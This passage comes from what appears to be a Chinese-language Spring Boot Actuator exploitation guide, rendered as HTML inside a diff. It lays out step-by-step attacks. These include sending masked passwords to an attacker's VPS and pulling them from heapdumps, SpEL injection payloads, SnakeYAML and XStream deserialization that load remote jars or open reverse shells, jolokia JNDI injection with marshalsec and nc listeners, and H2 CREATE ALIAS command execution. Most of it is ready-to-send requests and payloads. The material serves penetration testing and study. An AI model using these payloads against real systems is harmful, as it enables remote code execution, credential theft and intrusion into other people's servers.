+Content-Type: application/x-www-form-urlencoded
+
+eureka.client.serviceUrl.defaultZone=http://your-vps-ip/${security.user.password}
+</code></pre></div></div>
+
+<p>spring 2.x</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /actuator/env
+Content-Type: application/json
+
+{"name":"eureka.client.serviceUrl.defaultZone","value":"http://your-vps-ip/${security.user.password}"}
+</code></pre></div></div>
+
+<h5 id="步骤四-刷新配置-1">步骤四： 刷新配置</h5>
+
+<p>spring 1.x</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /refresh
+Content-Type: application/x-www-form-urlencoded
+
+</code></pre></div></div>
+
+<p>spring 2.x</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /actuator/refresh
+Content-Type: application/json
+
+</code></pre></div></div>
+
+<h3 id="0x06获取被星号脱敏的密码的明文-方法四">0x06：获取被星号脱敏的密码的明文 (方法四)</h3>
+
+<blockquote>
+  <p>访问 /env 接口时，spring actuator 会将一些带有敏感关键词(如 password、secret)的属性名对应的属性值用 * 号替换达到脱敏的效果</p>
+</blockquote>
+
+<h4 id="利用条件-3">利用条件：</h4>
+
+<ul>
+  <li>可正常 GET 请求目标 <code class="language-plaintext highlighter-rouge">/heapdump</code> 或 <code class="language-plaintext highlighter-rouge">/actuator/heapdump</code> 接口</li>
+</ul>
+
+<h4 id="利用方法-3">利用方法：</h4>
+
+<h5 id="步骤一-找到想要获取的属性名-3">步骤一： 找到想要获取的属性名</h5>
+
+<p>GET 请求目标网站的 <code class="language-plaintext highlighter-rouge">/env</code> 或 <code class="language-plaintext highlighter-rouge">/actuator/env</code> 接口，搜索 <code class="language-plaintext highlighter-rouge">******</code> 关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。</p>
+
+<h5 id="步骤二-下载-jvm-heap-信息">步骤二： 下载 jvm heap 信息</h5>
+
+<blockquote>
+  <p>下载的 heapdump 文件大小通常在 50M—500M 之间，有时候也可能会大于 2G</p>
+</blockquote>
+
+<p><code class="language-plaintext highlighter-rouge">GET</code> 请求目标的 <code class="language-plaintext highlighter-rouge">/heapdump</code> 或 <code class="language-plaintext highlighter-rouge">/actuator/heapdump</code> 接口，下载应用实时的 JVM 堆信息</p>
+
+<h5 id="步骤三-使用-mat-获得-jvm-heap-中的密码明文">步骤三： 使用 MAT 获得 jvm heap 中的密码明文</h5>
+
+<p>参考 <a href="https://landgrey.me/blog/16/">文章</a> 方法，使用 <a href="https://www.eclipse.org/mat/downloads.php">Eclipse Memory Analyzer</a> 工具的 OQL 语句 <code class="language-plaintext highlighter-rouge">select * from org.springframework.web.context.support.StandardServletEnvironment</code>， 辅助快速过滤分析，获得密码明文</p>
+
+<h2 id="二远程代码执行">二：远程代码执行</h2>
+
+<blockquote>
+  <p>由于 spring boot 相关漏洞可能是多个组件漏洞组合导致的，所以有些漏洞名字起的不太正规，以能区分为准</p>
+</blockquote>
+
+<h3 id="0x01whitelabel-error-page-spel-rce">0x01：whitelabel error page SpEL RCE</h3>
+
+<h4 id="利用条件-4">利用条件：</h4>
+
+<ul>
+  <li>spring boot 1.1.0-1.1.12、1.2.0-1.2.7、1.3.0</li>
+  <li>至少知道一个触发 springboot 默认错误页面的接口及参数名</li>
+</ul>
+
+<h4 id="利用方法-4">利用方法：</h4>
+
+<h5 id="步骤一找到一个正常传参处">步骤一：找到一个正常传参处</h5>
+
+<p>比如发现访问  <code class="language-plaintext highlighter-rouge">/article?id=xxx</code> ，页面会报状态码为 500 的错误： <code class="language-plaintext highlighter-rouge">Whitelabel Error Page</code>，则后续 payload 都将会在参数 id 处尝试。</p>
+
+<h5 id="步骤二执行-spel-表达式">步骤二：执行 SpEL 表达式</h5>
+
+<p>输入 <code class="language-plaintext highlighter-rouge">/article?id=${7*7}</code> ，如果发现报错页面将 7*7 的值 49 计算出来显示在报错页面上，那么基本可以确定目标存在 SpEL 表达式注入漏洞。</p>
+
+<p>由字符串格式转换成 <code class="language-plaintext highlighter-rouge">0x**</code> java 字节形式，方便执行任意代码：</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># coding: utf-8
+</span>
+<span class="n">result</span> <span class="o">=</span> <span class="s">""</span>
+<span class="n">target</span> <span class="o">=</span> <span class="s">'open -a Calculator'</span>
+<span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">target</span><span class="p">:</span>
+    <span class="n">result</span> <span class="o">+=</span> <span class="nb">hex</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">x</span><span class="p">))</span> <span class="o">+</span> <span class="s">","</span>
+<span class="k">print</span><span class="p">(</span><span class="n">result</span><span class="p">.</span><span class="n">rstrip</span><span class="p">(</span><span class="s">','</span><span class="p">))</span>
+</code></pre></div></div>
+
+<p>执行 <code class="language-plaintext highlighter-rouge">open -a Calculator</code> 命令</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">$</span><span class="o">{</span><span class="no">T</span><span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Runtime</span><span class="o">).</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="k">new</span> <span class="nc">String</span><span class="o">(</span><span class="k">new</span> <span class="kt">byte</span><span class="o">[]{</span><span class="mh">0x6f</span><span class="o">,</span><span class="mh">0x70</span><span class="o">,</span><span class="mh">0x65</span><span class="o">,</span><span class="mh">0x6e</span><span class="o">,</span><span class="mh">0x20</span><span class="o">,</span><span class="mh">0x2d</span><span class="o">,</span><span class="mh">0x61</span><span class="o">,</span><span class="mh">0x20</span><span class="o">,</span><span class="mh">0x43</span><span class="o">,</span><span class="mh">0x61</span><span class="o">,</span><span class="mh">0x6c</span><span class="o">,</span><span class="mh">0x63</span><span class="o">,</span><span class="mh">0x75</span><span class="o">,</span><span class="mh">0x6c</span><span class="o">,</span><span class="mh">0x61</span><span class="o">,</span><span class="mh">0x74</span><span class="o">,</span><span class="mh">0x6f</span><span class="o">,</span><span class="mh">0x72</span><span class="o">}))}</span>
+</code></pre></div></div>
+
+<h4 id="漏洞原理">漏洞原理：</h4>
+
+<ol>
+  <li>spring boot 处理参数值出错，流程进入 <code class="language-plaintext highlighter-rouge">org.springframework.util.PropertyPlaceholderHelper</code> 类中</li>
+  <li>此时 URL 中的参数值会用 <code class="language-plaintext highlighter-rouge">parseStringValue</code> 方法进行递归解析</li>
+  <li>其中  <code class="language-plaintext highlighter-rouge">${}</code>  包围的内容都会被 <code class="language-plaintext highlighter-rouge">org.springframework.boot.autoconfigure.web.ErrorMvcAutoConfiguration</code> 类的 <code class="language-plaintext highlighter-rouge">resolvePlaceholder</code> 方法当作 SpEL 表达式被解析执行，造成 RCE 漏洞</li>
+</ol>
+
+<h4 id="漏洞分析">漏洞分析：</h4>
+
+<p>​	<a href="https://www.cnblogs.com/litlife/p/10183137.html">SpringBoot SpEL表达式注入漏洞-分析与复现</a></p>
+
+<h4 id="漏洞环境">漏洞环境：</h4>
+
+<p><a href="https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-spel-rce">repository/springboot-spel-rce</a></p>
+
+<p>正常访问：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://127.0.0.1:9091/article?id=66
+</code></pre></div></div>
+
+<p>执行 <code class="language-plaintext highlighter-rouge">open -a Calculator</code> 命令：</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">http:</span><span class="c1">//127.0.0.1:9091/article?id=${T(java.lang.Runtime).getRuntime().exec(new%20String(new%20byte[]{0x6f,0x70,0x65,0x6e,0x20,0x2d,0x61,0x20,0x43,0x61,0x6c,0x63,0x75,0x6c,0x61,0x74,0x6f,0x72}))}</span>
+</code></pre></div></div>
+
+<h3 id="0x02spring-cloud-snakeyaml-rce">0x02：spring cloud SnakeYAML RCE</h3>
+
+<h4 id="利用条件-5">利用条件：</h4>
+
+<ul>
+  <li>可以 POST 请求目标网站的 <code class="language-plaintext highlighter-rouge">/env</code> 接口设置属性</li>
+  <li>可以 POST 请求目标网站的 <code class="language-plaintext highlighter-rouge">/refresh</code> 接口刷新配置（存在 <code class="language-plaintext highlighter-rouge">spring-boot-starter-actuator</code> 依赖）</li>
+  <li>目标依赖的 <code class="language-plaintext highlighter-rouge">spring-cloud-starter</code> 版本 &lt; 1.3.0.RELEASE</li>
+  <li>目标可以请求攻击者的 HTTP 服务器（请求可出外网）</li>
+</ul>
+
+<h4 id="利用方法-5">利用方法：</h4>
+
+<h5 id="步骤一-托管-yml-和-jar-文件">步骤一： 托管 yml 和 jar 文件</h5>
+
+<p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># 使用 python 快速开启 http server</span>
+
+python2 <span class="nt">-m</span> SimpleHTTPServer 80
+python3 <span class="nt">-m</span> http.server 80
+</code></pre></div></div>
+
+<p>在网站根目录下放置后缀为 <code class="language-plaintext highlighter-rouge">yml</code> 的文件  <code class="language-plaintext highlighter-rouge">example.yml</code>，内容如下：</p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">!!javax.script.ScriptEngineManager</span> <span class="pi">[</span>
+  <span class="kt">!!java.net.URLClassLoader</span> <span class="pi">[[</span>
+    <span class="kt">!!java.net.URL</span> <span class="pi">[</span><span class="s2">"</span><span class="s">http://your-vps-ip/example.jar"</span><span class="pi">]</span>
+  <span class="pi">]]</span>
+<span class="pi">]</span>
+</code></pre></div></div>
+
+<p>在网站根目录下放置后缀为 <code class="language-plaintext highlighter-rouge">jar</code> 的文件  <code class="language-plaintext highlighter-rouge">example.jar</code>，内容是要执行的代码，代码编写及编译方式参考 <a href="https://github.com/artsploit/yaml-payload">yaml-payload</a>。</p>
+
+<h5 id="步骤二-设置-springcloudbootstraplocation-属性">步骤二： 设置 spring.cloud.bootstrap.location 属性</h5>
+
+<p>spring 1.x</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /env
+Content-Type: application/x-www-form-urlencoded
+
+spring.cloud.bootstrap.location=http://your-vps-ip/example.yml
+</code></pre></div></div>
+
+<p>spring 2.x</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /actuator/env
+Content-Type: application/json
+
+{"name":"spring.cloud.bootstrap.location","value":"http://your-vps-ip/example.yml"}
+</code></pre></div></div>
+
+<h5 id="步骤三-刷新配置">步骤三： 刷新配置</h5>
+
+<p>spring 1.x</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /refresh
+Content-Type: application/x-www-form-urlencoded
+
+</code></pre></div></div>
+
+<p>spring 2.x</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /actuator/refresh
+Content-Type: application/json
+
+</code></pre></div></div>
+
+<h4 id="漏洞原理-1">漏洞原理：</h4>
+
+<ol>
+  <li>spring.cloud.bootstrap.location 属性被设置为外部恶意 yml 文件 URL 地址</li>
+  <li>refresh 触发目标机器请求远程 HTTP 服务器上的 yml 文件，获得其内容</li>
+  <li>SnakeYAML 由于存在反序列化漏洞，所以解析恶意 yml 内容时会完成指定的动作</li>
+  <li>先是触发 java.net.URL 去拉取远程 HTTP 服务器上的恶意 jar 文件</li>
+  <li>然后是寻找 jar 文件中实现 javax.script.ScriptEngineFactory 接口的类并实例化</li>
+  <li>实例化类时执行恶意代码，造成 RCE 漏洞</li>
+</ol>
+
+<h4 id="漏洞分析-1">漏洞分析：</h4>
+
+<p>​	<a href="https://b1ngz.github.io/exploit-spring-boot-actuator-spring-cloud-env-note/">Exploit Spring Boot Actuator 之 Spring Cloud Env 学习笔记</a></p>
+
+<h4 id="漏洞环境-1">漏洞环境：</h4>
+
+<p><a href="https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springcloud-snakeyaml-rce">repository/springcloud-snakeyaml-rce</a></p>
+
+<p>正常访问：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://127.0.0.1:9092/env
+</code></pre></div></div>
+
+<h3 id="0x03eureka-xstream-deserialization-rce">0x03：eureka xstream deserialization RCE</h3>
+
+<h4 id="利用条件-6">利用条件：</h4>
+
+<ul>
+  <li>可以 POST 请求目标网站的 <code class="language-plaintext highlighter-rouge">/env</code> 接口设置属性</li>
+  <li>可以 POST 请求目标网站的 <code class="language-plaintext highlighter-rouge">/refresh</code> 接口刷新配置（存在 <code class="language-plaintext highlighter-rouge">spring-boot-starter-actuator</code> 依赖）</li>
+  <li>目标使用的  <code class="language-plaintext highlighter-rouge">eureka-client</code> &lt; 1.8.7（通常包含在 <code class="language-plaintext highlighter-rouge">spring-cloud-starter-netflix-eureka-client</code> 依赖中）</li>
+  <li>目标可以请求攻击者的 HTTP 服务器（请求可出外网）</li>
+</ul>
+
+<h4 id="利用方法-6">利用方法：</h4>
+
+<h5 id="步骤一架设响应恶意-xstream-payload-的网站">步骤一：架设响应恶意 XStream payload 的网站</h5>
+
+<p>提供一个依赖 Flask 并符合要求的 <a href="https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-xstream-rce.py">python 脚本示例</a>，作用是利用目标 Linux 机器上自带的 python 来反弹shell。</p>
+
+<p>使用 python 在自己控制的服务器上运行以上的脚本，并根据实际情况修改脚本中反弹 shell 的 ip 地址和 端口号。</p>
+
+<h5 id="步骤二监听反弹-shell-的端口">步骤二：监听反弹 shell 的端口</h5>
+
+<p>一般使用 nc 监听端口，等待反弹 shell</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lvp</span> 443
+</code></pre></div></div>
+
+<h5 id="步骤三设置-eurekaclientserviceurldefaultzone-属性">步骤三：设置 eureka.client.serviceUrl.defaultZone 属性</h5>
+
+<p>spring 1.x</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /env
+Content-Type: application/x-www-form-urlencoded
+
+eureka.client.serviceUrl.defaultZone=http://your-vps-ip/example
+</code></pre></div></div>
+
+<p>spring 2.x</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /actuator/env
+Content-Type: application/json
+
+{"name":"eureka.client.serviceUrl.defaultZone","value":"http://your-vps-ip/example"}
+</code></pre></div></div>
+
+<h5 id="步骤四刷新配置">步骤四：刷新配置</h5>
+
+<p>spring 1.x</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /refresh
+Content-Type: application/x-www-form-urlencoded
+
+</code></pre></div></div>
+
+<p>spring 2.x</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /actuator/refresh
+Content-Type: application/json
+
+</code></pre></div></div>
+
+<h4 id="漏洞原理-2">漏洞原理：</h4>
+
+<ol>
+  <li>eureka.client.serviceUrl.defaultZone 属性被设置为恶意的外部 eureka server URL 地址</li>
+  <li>refresh 触发目标机器请求远程 URL，提前架设的 fake eureka server 就会返回恶意的 payload</li>
+  <li>目标机器相关依赖解析 payload，触发 XStream 反序列化，造成 RCE 漏洞</li>
+</ol>
+
+<h4 id="漏洞分析-2">漏洞分析：</h4>
+
+<p>​	<a href="https://www.freebuf.com/column/234719.html">Spring Boot Actuator从未授权访问到getshell</a></p>
+
+<h4 id="漏洞环境-2">漏洞环境：</h4>
+
+<p><a href="https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-eureka-xstream-rce">repository/springboot-eureka-xstream-rce</a></p>
+
+<p>正常访问：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://127.0.0.1:9093/env
+</code></pre></div></div>
+
+<h3 id="0x04jolokia-logback-jndi-rce">0x04：jolokia logback JNDI RCE</h3>
+
+<h4 id="利用条件-7">利用条件：</h4>
+
+<ul>
+  <li>目标网站存在 <code class="language-plaintext highlighter-rouge">/jolokia</code> 或 <code class="language-plaintext highlighter-rouge">/actuator/jolokia</code> 接口</li>
+  <li>目标使用了 <code class="language-plaintext highlighter-rouge">jolokia-core</code> 依赖（版本要求暂未知）并且环境中存在相关 MBean</li>
+  <li>
+    <p>目标可以请求攻击者的 HTTP 服务器（请求可出外网）</p>
+  </li>
+  <li>JNDI 注入受目标 JDK 版本影响，jdk &lt; 6u201/7u191/8u182/11.0.1（LDAP 方式）</li>
+</ul>
+
+<h4 id="利用方法-7">利用方法：</h4>
+
+<h5 id="步骤一查看已存在的-mbeans">步骤一：查看已存在的 MBeans</h5>
+
+<p>访问 <code class="language-plaintext highlighter-rouge">/jolokia/list</code> 接口，查看是否存在 <code class="language-plaintext highlighter-rouge">ch.qos.logback.classic.jmx.JMXConfigurator</code> 和 <code class="language-plaintext highlighter-rouge">reloadByURL</code> 关键词。</p>
+
+<h5 id="步骤二托管-xml-文件">步骤二：托管 xml 文件</h5>
+
+<p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># 使用 python 快速开启 http server</span>
+
+python2 <span class="nt">-m</span> SimpleHTTPServer 80
+python3 <span class="nt">-m</span> http.server 80
+</code></pre></div></div>
+
+<p>在根目录放置以 <code class="language-plaintext highlighter-rouge">xml</code> 结尾的 <code class="language-plaintext highlighter-rouge">example.xml</code>  文件，内容如下：</p>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;configuration&gt;</span>
+  <span class="nt">&lt;insertFromJNDI</span> <span class="na">env-entry-name=</span><span class="s">"ldap://your-vps-ip:1389/JNDIObject"</span> <span class="na">as=</span><span class="s">"appName"</span> <span class="nt">/&gt;</span>
+<span class="nt">&lt;/configuration&gt;</span>
+</code></pre></div></div>
+
+<h5 id="步骤三准备要执行的-java-代码">步骤三：准备要执行的 Java 代码</h5>
+
+<p>编写优化过后的用来反弹 shell 的 <a href="https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/JNDIObject.java">Java 示例代码</a>  <code class="language-plaintext highlighter-rouge">JNDIObject.java</code>，</p>
+
+<p>使用兼容低版本 jdk 的方式编译：</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>javac <span class="nt">-source</span> 1.5 <span class="nt">-target</span> 1.5 JNDIObject.java
+</code></pre></div></div>
+
+<p>然后将生成的 <code class="language-plaintext highlighter-rouge">JNDIObject.class</code> 文件拷贝到 <strong>步骤二</strong> 中的网站根目录。</p>
+
+<h5 id="步骤四架设恶意-ldap-服务">步骤四：架设恶意 ldap 服务</h5>
+
+<p>下载 <a href="https://github.com/mbechler/marshalsec">marshalsec</a> ，使用下面命令架设对应的 ldap 服务：</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>java <span class="nt">-cp</span> marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://your-vps-ip:80/#JNDIObject 1389
+</code></pre></div></div>
+
+<h5 id="步骤五监听反弹-shell-的端口">步骤五：监听反弹 shell 的端口</h5>
+
+<p>一般使用 nc 监听端口，等待反弹 shell</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lv</span> 443
+</code></pre></div></div>
+
+<h5 id="步骤六从外部-url-地址加载日志配置文件">步骤六：从外部 URL 地址加载日志配置文件</h5>
+
+<blockquote>
+  <p>⚠️ 如果目标成功请求了example.xml 并且 marshalsec 也接收到了目标请求，但是目标没有请求 JNDIObject.class，大概率是因为目标环境的 jdk 版本太高，导致 JNDI 利用失败。</p>
+</blockquote>
+
+<p>替换实际的 your-vps-ip 地址访问 URL 触发漏洞：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/your-vps-ip!/example.xml
+</code></pre></div></div>
+
+<h4 id="漏洞原理-3">漏洞原理：</h4>
+
+<ol>
+  <li>直接访问可触发漏洞的 URL，相当于通过 jolokia 调用 <code class="language-plaintext highlighter-rouge">ch.qos.logback.classic.jmx.JMXConfigurator</code> 类的 <code class="language-plaintext highlighter-rouge">reloadByURL</code> 方法</li>
+  <li>目标机器请求外部日志配置文件 URL 地址，获得恶意 xml 文件内容</li>
+  <li>目标机器使用 saxParser.parse 解析 xml 文件 (这里导致了 xxe 漏洞)</li>
+  <li>xml 文件中利用 <code class="language-plaintext highlighter-rouge">logback</code> 依赖的 <code class="language-plaintext highlighter-rouge">insertFormJNDI</code> 标签，设置了外部 JNDI 服务器地址</li>
+  <li>目标机器请求恶意  JNDI 服务器，导致 JNDI 注入，造成 RCE 漏洞</li>
+</ol>
+
+<h4 id="漏洞分析-3">漏洞分析：</h4>
+
+<p>​	<a href="https://xz.aliyun.com/t/4258">spring boot actuator rce via jolokia</a></p>
+
+<h4 id="漏洞环境-3">漏洞环境：</h4>
+
+<p><a href="https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-jolokia-logback-rce">repository/springboot-jolokia-logback-rce</a></p>
+
+<p>正常访问：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://127.0.0.1:9094/env
+</code></pre></div></div>
+
+<h3 id="0x05jolokia-realm-jndi-rce">0x05：jolokia Realm JNDI RCE</h3>
+
+<h4 id="利用条件-8">利用条件：</h4>
+
+<ul>
+  <li>目标网站存在 <code class="language-plaintext highlighter-rouge">/jolokia</code> 或 <code class="language-plaintext highlighter-rouge">/actuator/jolokia</code> 接口</li>
+  <li>目标使用了 <code class="language-plaintext highlighter-rouge">jolokia-core</code> 依赖（版本要求暂未知）并且环境中存在相关 MBean</li>
+  <li>目标可以请求攻击者的服务器（请求可出外网）</li>
+  <li>JNDI 注入受目标 JDK 版本影响，jdk &lt; 6u141/7u131/8u121（RMI 方式）</li>
+</ul>
+
+<h4 id="利用方法-8">利用方法：</h4>
+
+<h5 id="步骤一查看已存在的-mbeans-1">步骤一：查看已存在的 MBeans</h5>
+
+<p>访问 <code class="language-plaintext highlighter-rouge">/jolokia/list</code> 接口，查看是否存在 <code class="language-plaintext highlighter-rouge">type=MBeanFactory</code> 和 <code class="language-plaintext highlighter-rouge">createJNDIRealm</code> 关键词。</p>
+
+<h5 id="步骤二准备要执行的-java-代码">步骤二：准备要执行的 Java 代码</h5>
+
+<p>编写优化过后的用来反弹 shell 的 <a href="https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/JNDIObject.java">Java 示例代码</a>  <code class="language-plaintext highlighter-rouge">JNDIObject.java</code>。</p>
+
+<h5 id="步骤三托管-class-文件">步骤三：托管 class 文件</h5>
+
+<p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># 使用 python 快速开启 http server</span>
+
+python2 <span class="nt">-m</span> SimpleHTTPServer 80
+python3 <span class="nt">-m</span> http.server 80
+</code></pre></div></div>
+
+<p>将<strong>步骤二</strong>中编译好的 class 文件拷贝到 HTTP 服务器根目录。</p>
+
+<h5 id="步骤四架设恶意-rmi-服务">步骤四：架设恶意 rmi 服务</h5>
+
+<p>下载 <a href="https://github.com/mbechler/marshalsec">marshalsec</a> ，使用下面命令架设对应的 rmi 服务：</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>java <span class="nt">-cp</span> marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://your-vps-ip:80/#JNDIObject 1389
+</code></pre></div></div>
+
+<h5 id="步骤五监听反弹-shell-的端口-1">步骤五：监听反弹 shell 的端口</h5>
+
+<p>一般使用 nc 监听端口，等待反弹 shell</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lvp</span> 443
+</code></pre></div></div>
+
+<h5 id="步骤六发送恶意-payload">步骤六：发送恶意 payload</h5>
+
+<p>根据实际情况修改 <a href="https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-realm-jndi-rce.py">springboot-realm-jndi-rce.py</a> 脚本中的目标地址，RMI 地址、端口等信息，然后在自己控制的服务器上运行。</p>
+
+<h4 id="漏洞原理-4">漏洞原理：</h4>
+
+<ol>
+  <li>利用 jolokia 调用 createJNDIRealm 创建 JNDIRealm</li>
+  <li>设置 connectionURL 地址为 RMI Service URL</li>
+  <li>设置 contextFactory 为 RegistryContextFactory</li>
+  <li>停止 Realm</li>
+  <li>启动 Realm 以触发指定 RMI 地址的  JNDI 注入，造成 RCE 漏洞</li>
+</ol>
+
+<h4 id="漏洞分析-4">漏洞分析：</h4>
+
+<p>​	<a href="https://static.anquanke.com/download/b/security-geek-2019-q1/article-10.html">Yet Another Way to Exploit Spring Boot Actuators via Jolokia</a></p>
+
+<h4 id="漏洞环境-4">漏洞环境：</h4>
+
+<p><a href="https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-jolokia-logback-rce">repository/springboot-jolokia-logback-rce</a></p>
+
+<p>正常访问：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://127.0.0.1:9094/env
+</code></pre></div></div>
+
+<h3 id="0x06h2-database-query-rce">0x06：h2 database query RCE</h3>
+
+<h4 id="利用条件-9">利用条件：</h4>
+
+<ul>
+  <li>可以 POST 请求目标网站的 <code class="language-plaintext highlighter-rouge">/env</code> 接口设置属性</li>
+  <li>可以 POST 请求目标网站的 <code class="language-plaintext highlighter-rouge">/restart</code> 接口重启应用（存在 spring-boot-starter-actuator 依赖）</li>
+  <li>存在 <code class="language-plaintext highlighter-rouge">com.h2database.h2</code> 依赖（版本要求暂未知）</li>
+</ul>
+
+<h4 id="利用方法-9">利用方法：</h4>
+
+<h5 id="步骤一设置-springdatasourcehikariconnection-test-query-属性">步骤一：设置 spring.datasource.hikari.connection-test-query 属性</h5>
+
+<blockquote>
+  <p>⚠️ 下面payload 中的 ‘T5’ 方法每一次执行命令后都需要更换名称 (如 T6) ，然后才能被重新创建使用，否则下次 restart 重启应用时漏洞不会被触发</p>
+</blockquote>
+
+<p>spring 1.x（无回显执行命令）</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /env
+Content-Type: application/x-www-form-urlencoded
+
+spring.datasource.hikari.connection-test-query=CREATE ALIAS T5 AS CONCAT('void ex(String m1,String m2,String m3)throws Exception{Runti','me.getRun','time().exe','c(new String[]{m1,m2,m3});}');CALL T5('cmd','/c','calc');
+</code></pre></div></div>
+
+<p>spring 2.x（无回显执行命令）</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /actuator/env
+Content-Type: application/json
+
+{"name":"spring.datasource.hikari.connection-test-query","value":"CREATE ALIAS T5 AS CONCAT('void ex(String m1,String m2,String m3)throws Exception{Runti','me.getRun','time().exe','c(new String[]{m1,m2,m3});}');CALL T5('cmd','/c','calc');"}
+</code></pre></div></div>
+
+<h5 id="步骤二重启应用">步骤二：重启应用</h5>
+
+<p>spring 1.x</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /restart
+Content-Type: application/x-www-form-urlencoded
+
+</code></pre></div></div>
+
+<p>spring 2.x</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /actuator/restart
+Content-Type: application/json
+
+</code></pre></div></div>
+
+<h4 id="漏洞原理-5">漏洞原理：</h4>
+
+<ol>
+  <li>spring.datasource.hikari.connection-test-query 属性被设置为一条恶意的 <code class="language-plaintext highlighter-rouge">CREATE ALIAS</code> 创建自定义函数的 SQL 语句</li>
+  <li>其属性对应 HikariCP 数据库连接池的 connectionTestQuery 配置，定义一个新数据库连接之前被执行的 SQL 语句</li>
+  <li>restart 重启应用，会建立新的数据库连接</li>
+  <li>如果 SQL 语句中的自定义函数还没有被执行过，那么自定义函数就会被执行，造成 RCE 漏洞</li>
+</ol>
+
+<h4 id="漏洞分析-5">漏洞分析：</h4>
+
+<p>​	<a href="https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database">remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database</a></p>
+
+<h4 id="漏洞环境-5">漏洞环境：</h4>
+
+<p><a href="https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-h2-database-rce">repository/springboot-h2-database-rce</a></p>
+
+<p>正常访问：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://127.0.0.1:9096/actuator/env
+</code></pre></div></div>
+
+<h3 id="0x07h2-database-console-jndi-rce">0x07：h2 database console JNDI RCE</h3>
+
+<h4 id="利用条件-10">利用条件：</h4>
+
+<ul>
+  <li>存在 <code class="language-plaintext highlighter-rouge">com.h2database.h2</code> 依赖（版本要求暂未知）</li>
+  <li>spring 配置中启用 h2 console  <code class="language-plaintext highlighter-rouge">spring.h2.console.enabled=true</code></li>
+  <li>目标可以请求攻击者的服务器（请求可出外网）</li>
